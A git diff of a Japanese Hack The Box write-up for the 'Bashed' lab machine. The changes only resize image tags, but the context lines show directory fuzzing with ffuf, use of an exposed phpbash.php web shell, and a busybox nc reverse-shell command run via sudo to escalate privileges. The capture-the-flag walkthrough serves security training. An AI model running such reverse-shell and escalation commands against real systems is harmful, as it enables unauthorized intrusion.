@@ -25,7 +25,7 @@ Open 10.129.14.206:80
 ## STEP 2
 80番にアクセス  
 大した情報はなさそう  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_01.png" width="100%" height="100%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_01.png">  
 列挙するといろいろ発見
 ```sh
 └─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.14.206/FUZZ
@@ -66,13 +66,13 @@ uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration:
 :: Progress: [4614/4614] :: Job [1/1] :: 38 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
 ```
 /dev上にphpbash.phpを発見  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_02.png" width="50%" height="50%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_02.png">  
 phpbash.phpにアクセス  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_03.png" width="75%" height="75%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_03.png">  
 コマンドが実行できた  
 ユーザフラグゲット、ルートフラグはアクセス拒否  
 権限昇格を探す  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_04.png" width="75%" height="75%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_04.png">  
 
 
 ## STEP 3
@@ -89,7 +89,7 @@ User www-data may run the following commands on bashed:
 ```
 scriptmanager権限のsudoで/bin/sh実行ができない  
 一旦、scriptmanager権限のリバースシェルをとる  
-<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_05.png" width="75%" height="75%">  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_05.png">  
 phpbash.php上で実行
 ```sh
 www-data@bashed:/var/www/html/dev# sudo -u scriptmanager busybox nc 10.10.16.4 4444 -e /bin/sh
